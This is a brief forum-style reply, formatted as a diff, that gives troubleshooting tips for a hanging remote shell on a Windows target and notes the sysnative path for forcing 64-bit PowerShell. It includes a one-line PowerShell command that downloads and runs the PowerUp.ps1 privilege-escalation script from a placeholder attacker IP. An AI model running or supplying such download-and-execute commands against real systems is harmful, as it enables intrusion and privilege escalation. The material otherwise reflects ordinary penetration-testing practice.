@@ -1,0 +1,9 @@
+Crash or hang? I've not had shells crash/disconnect, but I have had them hang (i.e. never return from the command). In that case usually just trying to run powershell.exe by itself will also hang the session. Sometimes you can get around it by doing something like
+
+echo iex(new-object net.webclient).downloadstring('``http://<attack_IP>/PowerUp.ps1') | powershell -nop -
+
+Also check on the target system for x86/x64. Sometimes you need to use the x64 Powershell to get the right results. If so then use this path to force x64 PowerShell on a x64 system:
+
+c:\windows\sysnative\windowspowershell\v1.0\powershell.exe
+
+NOTE: The v1.0 is misleading and it doesn't match the version from $PSVersionTable.
